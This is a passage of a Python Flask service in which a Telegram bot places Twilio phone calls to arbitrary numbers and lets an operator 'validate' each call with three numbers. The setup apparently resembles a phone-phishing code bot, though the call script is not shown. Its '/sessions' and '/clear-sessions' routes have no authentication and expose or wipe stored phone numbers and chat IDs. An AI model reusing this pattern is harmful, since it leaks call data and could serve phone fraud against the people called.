        # Añadir a mensajes procesados
        processed_message_ids.add(message_id)
        
        # Si el conjunto es demasiado grande, limpiar los más antiguos
        if len(processed_message_ids) > 100:
            # Mantener solo los últimos 50 IDs
            processed_message_ids = set(list(processed_message_ids)[-50:])
        
        logger.info(f"📨 MENSAJE DE TELEGRAM RECIBIDO: {message_text}")
        
        # Procesar comando de llamada
        if message_text.startswith('/llamar') or message_text.startswith('llamar'):
            process_call_command(chat_id, message_text)
            return
        
        # Procesar comandos de validación
        if message_text.startswith('/validar') or message_text.startswith('validar'):
            parts = message_text.split()
            
            if len(parts) >= 5:
                sid = parts[1]
                try:
                    vals = list(map(int, parts[2:5]))
                    
                    # Asegurar que la sesión existe para este SID
                    if sid not in global_user_sessions:
                        global_user_sessions[sid] = {}
                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en process_telegram_update")
                    
                    # Restablecer contador de intentos si existe
                    count_key = f"{sid}_retry_count"
                    if count_key in global_user_sessions[sid]:
                        global_user_sessions[sid][count_key] = 0
                        logger.info(f"🔄 Reiniciando contador de intentos para SID={sid}")
                    
                    # Guardar la validación
                    global_user_sessions[sid]['validacion'] = vals
                    save_session_to_file(global_user_sessions)
                    
                    logger.info(f"✅ VALIDACIÓN GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
                    
                    # Mostrar todas las sesiones para depuración
                    logger.info(f"📊 SESIONES ACTUALES: {list(global_user_sessions.keys())}")
                    logger.info(f"📊 DATOS DE SESIÓN PARA {sid}: {global_user_sessions.get(sid, {})}")
                    
                    # Confirmar al usuario de Telegram
                    send_telegram_response(chat_id, f"<b>✅ Validación guardada para {sid}:</b> {vals}")
                except Exception as e:
                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN TELEGRAM: {e}")
                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
            else:
                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")

def process_call_command(chat_id, message_text):
    """Procesa el comando /llamar para iniciar una llamada desde Telegram."""
    parts = message_text.split()
    
    # Verificar formato correcto: /llamar +123456789
    if len(parts) < 2:
        send_telegram_response(chat_id, "❌ <b>Formato incorrecto.</b> Usar: /llamar +NÚMERO_TELÉFONO")
        return False
    
    # Extraer número de teléfono
    phone_number = parts[1]
    
    # Validación básica del número de teléfono
    if not (phone_number.startswith('+') and len(phone_number) > 8):
        send_telegram_response(chat_id, "❌ <b>Formato de número inválido.</b> Debe comenzar con + y tener al menos 8 dígitos.")
        return False
    
    try:
        # Construir las URLs correctamente
        base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
        url = f"{base_url}/step1"
        status_callback_url = f"{base_url}/call-status-callback"
        
        logger.info(f"📞 URL para la llamada: {url}")
        logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
        
        # Hacer la llamada usando la API de Twilio con el callback de estado
        call = client.calls.create(
            to=phone_number,
            from_=TWILIO_PHONE_NUMBER,
            url=url,
            status_callback=status_callback_url,
            status_callback_method='POST',
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
        )

        # Inicializar la sesión para el nuevo SID con estado inicial
        global_user_sessions[call.sid] = {
            'call_status': 'initiated',
            'to_number': phone_number,
            'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'telegram_chat_id': chat_id  # Guardar el chat_id para notificaciones posteriores
        }
        save_session_to_file(global_user_sessions)
        
        logger.info(f"📞 Nueva llamada iniciada desde Telegram: SID={call.sid}, Número={phone_number}")
        
        # Confirmar al usuario de Telegram (solo una notificación)
        send_telegram_response(chat_id, f"✅ <b>Llamada iniciada al número {phone_number}</b>\nSID: {call.sid}\nEstado: Iniciando...")
        
        # NO enviar notificación duplicada aquí - el callback se encargará de las actualizaciones
        
        return True
        
    except Exception as e:
        logger.error(f"❌ ERROR AL INICIAR LLAMADA DESDE TELEGRAM: {e}")
        send_telegram_response(chat_id, f"❌ <b>Error al iniciar llamada:</b> {str(e)}")
        return False

def telegram_polling_worker():
    """Worker para el polling de Telegram en segundo plano."""
    global telegram_polling_active
    
    logger.info("🔄 Iniciando polling de Telegram...")
    
    while telegram_polling_active:
        try:
            updates = fetch_telegram_updates()
            for update in updates:
                process_telegram_update(update)
        except Exception as e:
            logger.error(f"❌ ERROR EN EL WORKER DE POLLING: {e}")
        
        time.sleep(1)
    
    logger.info("🛑 Polling de Telegram detenido")

def start_telegram_polling():
    """Inicia el polling de Telegram si no está ya activo."""
    global telegram_polling_active
    
    if not telegram_polling_active:
        telegram_polling_active = True
        threading.Thread(target=telegram_polling_worker, daemon=True).start()
        logger.info("🚀 Thread de polling de Telegram iniciado")
        return True
    return False

def stop_telegram_polling():
    """Detiene el polling de Telegram."""
    global telegram_polling_active
    
    if telegram_polling_active:
        telegram_polling_active = False
        logger.info("🛑 Solicitud para detener polling de Telegram recibida")
        return True
    return False

@app.route('/start-polling')
def api_start_polling():
    """API para iniciar manualmente el polling de Telegram."""
    result = start_telegram_polling()
    return jsonify({"status": "ok", "started": result})

@app.route('/stop-polling')
def api_stop_polling():
    """API para detener manualmente el polling de Telegram."""
    result = stop_telegram_polling()
    return jsonify({"status": "ok", "stopped": result})

@app.route('/polling-status')
def api_polling_status():
    """API para verificar el estado del polling de Telegram."""
    return jsonify({
        "status": "ok", 
        "polling_active": telegram_polling_active,
        "last_update_id": last_update_id
    })

@app.route('/sessions')
def api_sessions():
    """API para ver todas las sesiones activas."""
    return jsonify({
        "status": "ok",
        "sessions_count": len(global_user_sessions),
        "sessions": global_user_sessions
    })

@app.route('/clear-sessions')
def api_clear_sessions():
    """API para limpiar todas las sesiones."""
    global global_user_sessions
    global_user_sessions = {}
    save_session_to_file(global_user_sessions)
    return jsonify({"status": "ok", "message": "Sesiones eliminadas"})

# ----- FIN DE FUNCIONALIDAD -----

if __name__ == '__main__':
    # Cargar sesiones previas
    global_user_sessions = load_sessions_from_file()
    
    # Iniciar polling de Telegram automáticamente al iniciar el servidor
    start_telegram_polling()
    
    # Usar el puerto que proporciona Railway
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)